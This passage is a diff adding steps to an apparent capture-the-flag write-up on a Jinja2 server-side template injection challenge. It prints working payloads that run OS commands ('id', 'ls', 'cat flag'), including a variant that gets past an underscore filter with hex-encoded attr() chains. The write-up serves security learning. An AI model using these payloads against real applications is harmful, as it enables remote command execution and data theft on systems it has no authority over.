@@ -46,4 +46,28 @@ To exploit a Server-Side Template Injection (SSTI) vulnerability while bypassing
 
 <img width="1919" height="966" alt="Screenshot 2026-01-22 212658" src="https://github.com/user-attachments/assets/c46b6c1b-23a1-492f-941e-653c3597287f" />
 
+4. The application rendered: Hello confirming that user input was being processed by a **server-side template engine**.
+
+<img width="1919" height="965" alt="Screenshot 2026-01-22 212710" src="https://github.com/user-attachments/assets/a02c4d7e-b570-4f6e-baed-aa05ad6ae82b" />
+
+5. Based on the challenge name **SSTI2** and application behavior, inferred that the site might be vulnerable to **Server-Side Template Injection**.
+6. Tested a known SSTI payload targeting Jinja2 to execute OS commands: {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+
+<img width="1918" height="969" alt="Screenshot 2026-01-22 222412" src="https://github.com/user-attachments/assets/01646f59-bf2b-436e-b3a5-40cd3c93be2a" />
+
+7. The application returned: Stop trying to break me >:( indicating that certain characters (such as `_` and `.`) were being filtered.
+
+<img width="1919" height="964" alt="Screenshot 2026-01-22 221355" src="https://github.com/user-attachments/assets/10048769-210f-4368-83df-b017488979b8" />
+
+8. To bypass the input sanitization, used **hex-encoded representations** of restricted characters (e.g., `_` → `\x5f`).
+9. Crafted a modified SSTI payload using encoded attribute names:{{config|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
+
+<img width="1919" height="967" alt="Screenshot 2026-01-22 215429" src="https://github.com/user-attachments/assets/d1e9db10-e908-4917-b9eb-774b00994b0c" />
+
+10. Submitted the payload and observed a list of files present on the server.
+11. Identified a file named: flag
+
+<img width="1919" height="968" alt="Screenshot 2026-01-22 215536" src="https://github.com/user-attachments/assets/0e815c32-51a1-4da7-9dd9-73ae7eca1aeb" />
+
+12. Modified the payload to read the contents of the flag file: {{config|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
 
